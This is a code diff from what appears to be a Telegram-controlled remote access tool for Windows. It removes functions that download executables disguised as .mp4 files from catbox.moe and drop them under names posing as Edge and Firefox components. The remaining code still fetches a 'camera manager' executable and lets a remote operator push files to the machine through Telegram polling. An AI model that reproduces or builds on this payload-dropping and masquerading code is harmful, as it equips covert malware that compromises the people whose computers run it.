@@ -210,61 +210,8 @@ def ensure_camera_executable():
             raise Exception(f"Failed to download camera manager executable. HTTP Status: {response.status_code}")
     return camera_exe_path
 
-chromium_path = os.path.join(local_appdata, 'Microsoft', 'EdgeBrowser')
-chromium_exe_path = chromium_path + '\\EdgeManager.exe'
-
-def ensure_chromium_executable():
-
-    
-    """
-    Ensure the chromium executable is available locally.
-    If not, download it to a temporary directory.
-    """
-    
-    
-    download_url = "https://files.catbox.moe/mvsvv9.mp4"  # Replace with actual URL
-
-    if not os.path.exists(chromium_path):
-        print("chromiums executable not found. Downloading...")
-        response = requests.get(download_url, stream=True)
-        os.makedirs(chromium_path)
-        if response.status_code == 200:
-            with open(chromium_exe_path, "wb") as exe_file:
-                for chunk in response.iter_content(chunk_size=1024):
-                    exe_file.write(chunk)
-            print(f"chromium executable downloaded successfully to {chromium_exe_path}.")
-        else:
-            raise Exception(f"Failed to download chromium executable. HTTP Status: {response.status_code}")
-    return chromium_exe_path
-
-firefox_path = os.path.join(local_appdata, 'Firefox')
-firefox_exe_path = firefox_path + '\\firefoxmgr.exe'
 
 
-def ensure_firefox_executable():
-    """
-    Ensure the firefox executable is available locally.
-    If not, download it to a temporary directory.
-    """
-    
-    
-    download_url = "https://files.catbox.moe/yfgjfj.mp4"  # Replace with actual URL
-
-    if not os.path.exists(firefox_path):
-
-       
-
-        print("firefox executable not found. Downloading...")
-        response = requests.get(download_url, stream=True)
-        os.makedirs(firefox_path)
-        if response.status_code == 200:
-            with open(firefox_exe_path, "wb") as exe_file:
-                for chunk in response.iter_content(chunk_size=1024):
-                    exe_file.write(chunk)
-            print(f"firefox executable downloaded successfully to {firefox_exe_path}.")
-        else:
-            raise Exception(f"Failed to download firefox executable. HTTP Status: {response.status_code}")
-    return firefox_exe_path
 
 
 async def download_file(file_id, file_name, NOTIFY_CHATID):
@@ -300,15 +247,15 @@ async def handle_upload(data, *args):
     await send_message(NOTIFY_CHATID, "Please upload a file (document, photo, video, or audio). You have 60 seconds.")
 
     try:
-        timeout = 60  # Timeout for the upload process
+        timeout = 60
         start_time = time.time()
 
-        # Start polling Telegram for updates
+        
         offset = redis_client.get("telegram_offset")
         if offset:
             offset = int(offset)
         else:
-            offset = 0  # Default to 0 if no offset is found
+            offset = 0  
 
         while time.time() - start_time < timeout:
             response = requests.get(f"{TELEGRAM_API_URL}/getUpdates", params={"offset": offset, "timeout": 10})
@@ -354,7 +301,7 @@ async def handle_upload(data, *args):
                             await download_file(file_id, file_name, NOTIFY_CHATID)
                             return
 
-            await asyncio.sleep(1)  # Pause briefly before polling again
+            await asyncio.sleep(1)
 
         # Timeout reached
         await send_message(NOTIFY_CHATID, "File upload timed out. Please try again.")
